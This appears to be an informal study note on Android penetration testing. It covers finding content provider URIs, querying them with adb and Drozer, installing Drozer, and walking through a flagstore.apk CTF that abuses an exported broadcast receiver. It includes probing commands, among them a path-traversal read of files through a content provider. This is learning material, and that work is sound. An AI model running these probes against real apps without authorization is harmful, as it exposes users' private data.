- in pre [[Android/1. pre/content provider|content provider]] we talked about how to use content provider, but still need how to find app URIs, here how and where:
	- look for `<provider>` tag in `AndroidManifest.xml` 
	- URIs present in source code. use `grep "content://" -inR src_code/` 
- after list all URIs u can query it using adb:
	- `adb shell content query --uri <URI>`
	- `adb shell content query --uri "content://com.example.app/provider"`
- if data displayed back then u need to do one check before say content provider is not secure:
	- make query as normal user/app such `Drozer` (adb on emulator is root)
#### Drozer 
- have a client(on kali) and server(android app on mobile) 
- what ever command executed with Drozer privilege which is normal user.
- Drozer have only on permission: `Internet`.
- no external storage access, so it's shouldn't able to read from SD card unless u exploit something
##### install drozer
```shell
sudo apt install python2.7 python2.7-dev -y && curl -O https://bootstrap.pypa.io/pip/2.7/get-pip.py && sudo python2.7 get-pip.py
python2.7 -m pip install protobuf
python2.7 -m pip install pyopenssl
python2.7 -m pip install --upgrade setuptools 
python2.7 -m pip install twisted

wget https://github.com/mwrlabs/drozer/releases/download/2.4.4/drozer_2.4.4.deb
sudo dpkg -i drozer_2.4.4.deb
wget https://github.com/WithSecureLabs/drozer-agent/releases/download/2.5.2/agent-debug.apk
adb install agent-debug.apk
```
##### drozer connection
```shell
1. adb connect <ip>
2. lunch app in the emulator and enable emmbeded server
3. port forward: adb forward tcp:31415 tcp:31415
4. drozer console connect
5. dz>
```
##### drozer commands
```shell
? -> commands 
list -> list installed modules
most used modules:
run app.package.list #list installed apps packges
run app.package.attackserface #hunt low hungung frute
run app.package.backup # allowed backups
run app.package.debuggable # allewed debug
run app.package.info # info such package name
content provider modules:
app.provider.columns
            .finduri # list app uris 
            .downlaod
            .delete
            .query #query uri
            .read #read file
Broadcast Reciver
app.broadcast.sniff

others for activity, services, 
scanners for find leacked content providers, sqlinjections, path_traversal 
```
###### based on info retrains ether u have vuln or something interesting to start with
##### drozer example
##### unsecure content provider
```shell
bz> run app.provider.finduri <package_name> # find uris
dz> run app.provider.query <uri> #query a uri **if data displayed back then it's vuln**
dz> run app.provider.query content://com.exampl.app/provider --vertical
dz> run app.provider.read content://com.exampl.app/provider/../../../file # if the file disblayed then u find vuln content provider
```
##### unsecure Broadcast
here's demo and sol of `flagstore.apk` ctf
```shell
review decompiled app code:
1. reciver found : <receiver android:name="com.flagstore.ctf.flagstore.Send_to_Activity" android:exported="true"/>
2. which recive intent and start new activity
public void onReceive(Context context, Intent intent) {
        String msgText = intent.getStringExtra("msg");
        if (msgText.equalsIgnoreCase("OpenSesame"))
	        Intent outIntent = new Intent(context, CTFReceiver.class);
        .....
3. the new activty have btn, when pressed make broad cast intent:
button.setOnClickListener(new View.OnClickListener() { // from class: com.flagstore.ctf.flagstore.CTFReceiver.1
            @Override // android.view.View.OnClickListener
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setAction("com.flagstore.ctf.OUTGOING_INTENT");
                ...
                intent.putExtra("msg", output);
                CTFReceiver.this.sendBroadcast(intent);
so we 
1. fist send the intent: 
dz> run app.broadcast.send --component com.flagstore.ctf.flagstore com.flagstore.ctf.flagstore.Send_to_Activity --extra string "msg" "OpenSesame"
2. start sniffer and press btn in the app 
dz> run app.broadcast.sniff --action com.flagstore.ctf.OUTGOING_INTENT
[*] Output is updated once a second. Press Control+C to exit.

Action: com.flagstore.ctf.OUTGOING_INTENT
Raw: Intent { act=com.flagstore.ctf.OUTGOING_INTENT flg=0x10 (has extras) }
Extra: msg=CongratsGoodWorkYouFoundItIHopeYouUsedADBFlag:TheseIntentsAreFunAndEasyToUse (java.lang.String)
3. we have the flag: CongratsGoodWorkYouFoundItIHopeYouUsedADBFlag
```